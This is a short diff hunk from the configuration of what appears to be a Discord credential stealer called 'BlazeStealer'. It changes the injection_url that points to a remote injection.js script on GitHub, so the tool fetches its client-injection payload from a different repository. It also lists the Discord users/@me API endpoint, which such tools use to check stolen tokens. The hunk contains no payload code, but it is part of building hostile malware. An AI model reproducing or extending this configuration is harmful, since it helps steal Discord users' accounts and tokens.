@@ -13,7 +13,7 @@ const config = {
   embed_name: 'ThanksForUsingBlazeStaler', 
   embed_icon: 'https://cdn.discordapp.com/attachments/999027404506935388/1000540107251654707/BlazeLeaks.png',
   embed_color: 13828649,
-  injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js',
+  injection_url: 'https://raw.githubusercontent.com/Jqnvier/BlazeStealer/main/injection.js',
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
